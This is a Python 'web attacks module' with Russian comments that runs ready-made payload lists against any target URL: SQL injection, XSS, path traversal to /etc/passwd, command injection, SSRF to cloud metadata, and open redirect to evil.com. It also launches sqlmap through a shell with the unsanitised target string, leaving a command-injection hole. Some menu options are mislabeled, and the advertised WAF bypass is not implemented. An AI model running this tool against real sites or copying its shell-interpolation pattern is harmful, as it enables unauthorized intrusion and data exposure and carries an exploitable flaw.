#!/usr/bin/env python3
"""
WEB ATTACKS MODULE - отдельный модуль для твоего софта
"""

import os, sys, json, time, re, socket, hashlib, random, string
import urllib.parse, urllib.request, urllib.error, threading, gzip
from datetime import datetime

# ─── ЦВЕТА (БЕЛЫЕ) ──────────────────────────────────────────────────────

C = type('C', (), {})
for name, code in [
    ('RED','\033[97m'),('GREEN','\033[97m'),('YELLOW','\033[97m'),
    ('BLUE','\033[97m'),('MAGENTA','\033[97m'),('CYAN','\033[97m'),
    ('WHITE','\033[97m'),('GRAY','\033[97m'),('BOLD','\033[1m'),
    ('RESET','\033[0m'),
]:
    setattr(C, name, code)

# ─── ЗАВИСИМОСТИ ОТ ТВОЕГО СОФТА ────────────────────────────────────────
# Если у тебя есть свой log, save_json, http — замени эти заглушки.
# Иначе используй как есть.

WORKSPACE = os.path.expanduser("~/boogie-workspace")
RESULTS = os.path.join(WORKSPACE, "results")
os.makedirs(RESULTS, exist_ok=True)

class SimpleLog:
    def info(self, m): print(f"{C.GRAY}[*]{C.RESET} {m}")
    def ok(self, m): print(f"{C.GRAY}[+]{C.RESET} {m}")
    def warn(self, m): print(f"{C.GRAY}[!]{C.RESET} {m}")
    def error(self, m): print(f"{C.GRAY}[-]{C.RESET} {m}")
    def section(self, m): print(f"\n{C.BOLD}=== {m} ==={C.RESET}")
    def success(self, m): print(f"{C.GRAY}[✓]{C.RESET} {m}")
    def inp(self, m, d=""):
        v = input(f"{C.MAGENTA}[?]{C.RESET} {m} [{d}]: ").strip()
        return v if v else d

log = SimpleLog()

def save_json(name, data):
    p = os.path.join(RESULTS, f"{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(p, 'w') as f: json.dump(data, f, indent=2, default=str)
    log.ok(f"Saved -> {p}")
    return p

def save(name, data):
    p = os.path.join(RESULTS, f"{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(p, 'w') as f: f.write(data)
    log.ok(f"Saved -> {p}")
    return p

def http(url, method='GET', headers=None, data=None, timeout=10):
    req = urllib.request.Request(url, method=method)
    req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36')
    if headers:
        for k,v in headers.items(): req.add_header(k,v)
    if data:
        req.data = data.encode() if isinstance(data, str) else data
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read()
        if resp.headers.get('Content-Encoding') == 'gzip':
            body = gzip.decompress(body)
        return resp.status, body.decode('utf-8','replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8','replace'), dict(e.headers)
    except Exception as e:
        return 0, str(e), {}


class Web:
    @staticmethod
    def menu():
        print(f"""
{C.BOLD}{C.WHITE}╔══════════════════════════════════════╗
║           WEB ATTACKS MODULE         ║
╠══════════════════════════════════════╣{C.RESET}
  {C.WHITE}1.{C.RESET}  SQL Injection Scanner (Auto)
  {C.WHITE}2.{C.RESET}  SQLMap Integration
  {C.WHITE}3.{C.RESET}  XSS Detection (Reflected)
  {C.WHITE}4.{C.RESET}  XSS Detection (Stored)
  {C.WHITE}5.{C.RESET}  LFI/RFI Scanner
  {C.WHITE}6.{C.RESET}  Command Injection Tester
  {C.WHITE}7.{C.RESET}  SSRF Detection
  {C.WHITE}8.{C.RESET}  Open Redirect Finder
  {C.WHITE}9.{C.RESET}  CORS Misconfiguration
  {C.WHITE}10.{C.RESET} HTTP Header Analysis
  {C.WHITE}11.{C.RESET} WAF Detection & Bypass
  {C.WHITE}12.{C.RESET} Full Web Scan (All)
  {C.WHITE}0.{C.RESET}  Back
{C.BOLD}{C.WHITE}╚══════════════════════════════════════╝{C.RESET}""")

    @staticmethod
    def sqli(target):
        log.section(f"SQL INJECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        errors = [
            "SQL syntax.*MySQL","Warning.*mysql_","MySQLSyntaxErrorException",
            "PostgreSQL.*ERROR","Warning.*\\Wpg_","valid PostgreSQL result",
            "ORA-[0-9]{5}","Oracle error","Microsoft.*ODBC","Microsoft.*OLE DB",
            "Unclosed quotation mark","SQLite/JDBCDriver","SQLite.Exception",
            "driver.*SQL Server","Warning.*sqlite_","valid SQLite",
        ]
        payloads = [
            "'","\"","1' OR '1'='1","1\" OR \"1\"=\"1","1' OR '1'='1' --",
            "' OR 1=1--","' OR 'x'='x","admin' --","' OR SLEEP(5)--",
            "1' AND SLEEP(5)--","1' OR SLEEP(5) AND '1'='1",
            "' WAITFOR DELAY '0:0:5'--","1' UNION SELECT NULL--",
            "1' UNION SELECT 1,2,3--","1' AND 1=1","1' AND 1=2",
        ]
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            log.warn("No URL parameters found, scanning forms...")
            Web._form_sqli(target)
            return
        
        log.info(f"Testing {len(payloads)} payloads on {list(params.keys())}")
        found = []
        
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    s, body, _ = http(test_url, timeout=8)
                    for pattern in errors:
                        if re.search(pattern, body, re.I):
                            found.append((param, payload, pattern))
                            log.error(f"SQLi! Param: {param}, Payload: {payload}")
                            log.warn(f"  Pattern: {pattern}")
                            break
                    
                    if 'SLEEP' in payload or 'WAITFOR' in payload:
                        start = time.time()
                        http(test_url, timeout=10)
                        elapsed = time.time() - start
                        if elapsed > 4:
                            found.append((param, payload, f"Time-based (>4s: {elapsed:.1f}s)"))
                            log.error(f"Time-based SQLi! {elapsed:.1f}s delay")
                except: pass
        
        if not found:
            log.info("No SQLi detected with basic payloads")
            log.info("Run sqlmap for deeper analysis (option 2)")
        
        save_json(f"sqli_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def _form_sqli(target):
        s, body, _ = http(target)
        if s == 0: return
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', body, re.I)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', body, re.I)
        if forms and inputs:
            log.info(f"Found {len(forms)} forms with {len(inputs)} inputs")
            log.info("Run sqlmap for form-based SQLi")

    @staticmethod
    def sqlmap(target):
        log.section("SQLMAP INTEGRATION")
        target = ('http://' + target) if not target.startswith('http') else target
        import subprocess
        sqlmap = os.path.join(WORKSPACE, 'tools', 'sqlmap', 'sqlmap.py')
        if not os.path.exists(sqlmap):
            log.warn("sqlmap not found. Installing...")
            os.makedirs(os.path.join(WORKSPACE, 'tools'), exist_ok=True)
            subprocess.run(f"git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git {os.path.join(WORKSPACE, 'tools', 'sqlmap')}", shell=True, timeout=120)
        log.info(f"Running sqlmap on {target}")
        subprocess.run(f"python {sqlmap} -u {target} --batch --random-agent --output-dir={RESULTS}/sqlmap", shell=True, timeout=600)

    @staticmethod
    def xss(target):
        log.section(f"XSS DETECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>", "javascript:alert(1)",
            "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
        ]
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            log.warn("No parameters to test")
            return
        
        found = []
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                try:
                    s, body, _ = http(test_url, timeout=5)
                    if payload in body or urllib.parse.quote(payload) in body:
                        found.append((param, payload))
                        log.error(f"XSS Reflected! Param: {param}")
                except: pass
        
        if not found: log.info("No XSS detected")
        save_json(f"xss_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def lfi(target):
        log.section(f"LFI/RFI SCAN: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = [
            "../../../../etc/passwd", "../../../../etc/hosts",
            "../../../../windows/win.ini", "../../../../proc/self/environ",
            "....//....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/etc/passwd", "/etc/hosts",
        ]
        indicators = ['root:','[fonts]','localhost','<?php','127.0.0.1']
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        if not params: return
        
        found = []
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                try:
                    s, body, _ = http(test_url, timeout=8)
                    for ind in indicators:
                        if ind in body:
                            found.append((param, payload, ind))
                            log.error(f"LFI! Param: {param}")
                            break
                except: pass
        
        if not found: log.info("No LFI detected")
        save_json(f"lfi_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def cmdi(target):
        log.section(f"COMMAND INJECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = [
            "; ping -c 1 127.0.0.1", "| ping -c 1 127.0.0.1",
            "`ping -c 1 127.0.0.1`", "&& ping -c 1 127.0.0.1",
            "; sleep 5", "| sleep 5", "`sleep 5`",
            "; whoami", "| whoami", "`whoami`",
        ]
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        if not params: return
        
        found = []
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                try:
                    s, body, _ = http(test_url, timeout=10)
                    if any(x in body for x in ['uid=','root:','www-data','PING']):
                        found.append((param, payload))
                        log.error(f"Command injection! Param: {param}")
                except: pass
        
        if not found: log.info("No command injection detected")
        save_json(f"cmdi_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def headers(target):
        log.section(f"HEADER ANALYSIS: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        s, body, headers = http(target)
        
        checks = {
            'Strict-Transport-Security': 'Missing - no HSTS',
            'Content-Security-Policy': 'Missing - no CSP',
            'X-Frame-Options': 'Missing - clickjacking risk',
            'X-Content-Type-Options': 'Missing - MIME sniffing risk',
            'X-XSS-Protection': 'Missing - old XSS filter',
            'Referrer-Policy': 'Missing',
            'Permissions-Policy': 'Missing',
        }
        
        for header, msg in checks.items():
            if header in headers:
                log.ok(f"{header}: {headers[header]}")
            else:
                log.warn(msg)
        
        if 'Access-Control-Allow-Origin' in headers:
            if headers['Access-Control-Allow-Origin'] == '*':
                log.error("CORS: Wildcard origin!")
            else:
                log.info(f"CORS: {headers['Access-Control-Allow-Origin']}")
        
        out = '\n'.join(f"{k}: {v}" for k,v in headers.items())
        save(f"headers_{target.split('//')[1].split('/')[0]}", out)

    @staticmethod
    def waf_detect(target):
        log.section(f"WAF DETECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = ["' OR 1=1--", "<script>alert(1)</script>", "../../../../etc/passwd"]
        
        for payload in payloads:
            parsed = urllib.parse.urlparse(target)
            params = urllib.parse.parse_qs(parsed.query) or {'q': ['']}
            for param in params:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                s, body, headers = http(test_url, timeout=8)
                
                if s in [406, 501, 503, 403]:
                    log.error(f"WAF Blocked request (HTTP {s})")
                    if 'cloudflare' in str(headers).lower(): log.warn("Cloudflare detected")
                    if 'sucuri' in str(headers).lower(): log.warn("Sucuri detected")
                    if 'akamai' in str(headers).lower(): log.warn("Akamai detected")
                    if 'mod_security' in body.lower(): log.warn("ModSecurity detected")
                    break
        else:
            log.info("No WAF detected (or WAF allows malicious input)")

    @staticmethod
    def ssrf(target):
        log.section(f"SSRF DETECTION: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = [
            "http://127.0.0.1", "http://localhost", "http://169.254.169.254",
            "http://[::1]", "http://0.0.0.0", "http://127.1",
            "file:///etc/passwd", "gopher://127.0.0.1:8080",
        ]
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        if not params: return
        
        found = []
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                try:
                    s, body, _ = http(test_url, timeout=10)
                    if any(x in body for x in ['root:', 'localhost', '169.254', 'metadata']):
                        found.append((param, payload))
                        log.error(f"SSRF! Param: {param}")
                except: pass
        
        if not found: log.info("No SSRF detected")
        save_json(f"ssrf_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def open_redirect(target):
        log.section(f"OPEN REDIRECT: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        payloads = [
            "https://evil.com", "//evil.com", "https://evil.com@target.com",
            "/\\evil.com", "https://target.com.evil.com",
            "https://evil.com?target.com", "javascript:alert(1)",
        ]
        
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        if not params: return
        
        found = []
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                try:
                    s, body, headers = http(test_url, timeout=5)
                    loc = headers.get('Location', '')
                    if 'evil.com' in loc or payload in loc:
                        found.append((param, payload, loc))
                        log.error(f"Open Redirect! Param: {param} -> {loc}")
                except: pass
        
        if not found: log.info("No open redirect detected")
        save_json(f"redirect_{target.split('//')[1].split('/')[0]}", found)

    @staticmethod
    def full_web(target):
        log.section(f"FULL WEB SCAN: {target}")
        target = ('https://' + target) if not target.startswith('http') else target
        
        Web.headers(target)
        Web.waf_detect(target)
        Web.sqli(target)
        Web.xss(target)
        Web.lfi(target)
        Web.cmdi(target)
        Web.ssrf(target)
        Web.open_redirect(target)
        log.success("Full web scan complete")


def web_menu(target=None):
    """Точка входа для вызова из твоего софта"""
    if not target:
        target = log.inp("Target URL (with params)", "http://example.com/?id=1")
    
    while True:
        Web.menu()
        c = log.inp("Select option", "")
        
        handlers = {
            '1': lambda: Web.sqli(target),
            '2': lambda: Web.sqlmap(target),
            '3': lambda: Web.xss(target),
            '4': lambda: Web.xss(target),
            '5': lambda: Web.lfi(target),
            '6': lambda: Web.cmdi(target),
            '7': lambda: Web.ssrf(target),
            '8': lambda: Web.open_redirect(target),
            '9': lambda: Web.headers(target),
            '10': lambda: Web.headers(target),
            '11': lambda: Web.waf_detect(target),
            '12': lambda: Web.full_web(target),
        }
        handler = handlers.get(c)
        if handler:
            handler()
            input("\nPress Enter to continue...")
        elif c == '0':
            break


if __name__ == "__main__":
    web_menu()
